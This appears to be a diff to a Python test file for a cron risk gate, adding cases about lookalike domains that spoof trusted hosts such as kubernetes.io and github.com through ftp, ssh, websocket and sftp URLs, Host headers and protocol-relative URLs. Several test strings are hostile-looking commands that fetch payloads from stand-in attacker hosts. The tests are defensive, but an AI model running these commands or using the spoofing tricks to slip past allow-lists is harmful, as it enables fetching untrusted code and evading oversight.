@@ -348,6 +348,15 @@ class CronRiskGateTest(unittest.TestCase):
             ("curl {kubernetes.io.evil.co}", "kubernetes.io.evil.co", "kubernetes.io"),
             ("bash -c 'curl;kubernetes.io.evil.co'", "kubernetes.io.evil.co", "kubernetes.io"),
             ("curl -X GET|kubernetes.io.evil.co", "kubernetes.io.evil.co", "kubernetes.io"),
+            # Non-HTTP schemes, colon delimiters, and protocol-relative URLs (THREAT-002)
+            ("curl ftp://kubernetes.io.evil.co/payload", "kubernetes.io.evil.co", "kubernetes.io"),
+            ("git clone ssh://github.com.evil.org/repo", "github.com.evil.org", "github.com"),
+            ('curl -H "Host:kubernetes.io.evil.co" https://10.0.0.1', "kubernetes.io.evil.co", "kubernetes.io"),
+            ("kubectl --server=ftp://kubernetes.io.attacker.com get nodes", "kubernetes.io.attacker.com", "kubernetes.io"),
+            ("git clone git+ssh://github.com.evil.org/repo", "github.com.evil.org", "github.com"),
+            ("curl ws://kubernetes.io.evil.co/socket", "kubernetes.io.evil.co", "kubernetes.io"),
+            ("curl sftp://kubernetes.io.evil.co/file", "kubernetes.io.evil.co", "kubernetes.io"),
+            ("curl //kubernetes.io.evil.co/test", "kubernetes.io.evil.co", "kubernetes.io"),
         ]
         for cmd, expected_host, expected_apex in malicious_commands:
             with self.subTest(cmd=cmd):
@@ -385,6 +394,12 @@ class CronRiskGateTest(unittest.TestCase):
             "curl https://github.company.com/internal",
             "curl https://google.company.com/internal",
             '.metadata.labels["addonmanager.kubernetes.io/mode"]',
+            "curl ftp://kubernetes.io/pub",
+            "git clone ssh://github.com/kubernetes/kubernetes",
+            "git clone ssh://git@github.com:gke-labs/kube-agents.git",
+            'curl -H "Host:kubernetes.io" https://10.0.0.1',
+            'curl -H "Host:raw.githubusercontent.com" https://10.0.0.1',
+            "git clone https://github.com/kubernetes/kubernetes.io.git",
         ]
         for cmd in benign_commands:
             with self.subTest(cmd=cmd):
@@ -1634,6 +1649,10 @@ class CronRiskGateTest(unittest.TestCase):
             "curl https://k8s.io:6443/healthz",
             "curl https://admin:password@kubernetes.io/",
             "git clone git@github.com:gke-labs/kube-agents.git",
+            "curl ftp://kubernetes.io/pub",
+            "git clone ssh://github.com/kubernetes/kubernetes",
+            "git clone ssh://git@github.com:gke-labs/kube-agents.git",
+            'curl -H "Host:kubernetes.io" https://10.0.0.1',
             "curl https://mygoogle.com",
             "curl https://notkubernetes.io",
             "curl https://notk8s.io",
@@ -1648,6 +1667,10 @@ class CronRiskGateTest(unittest.TestCase):
             "curl https://admin:password@kubernetes.io.attacker.org/",
             "git clone git@github.com.evil.org:gke-labs/kube-agents.git",
             "curl 'https://evil.com/?redirect=kubernetes.io.evil.com'",
+            "curl ftp://kubernetes.io.evil.co/payload",
+            "git clone ssh://github.com.evil.org/repo",
+            'curl -H "Host:kubernetes.io.evil.co" https://10.0.0.1',
+            "kubectl --server=ftp://kubernetes.io.attacker.com get nodes",
         ]
         for cmd in refused:
             with self.subTest(cmd=cmd):
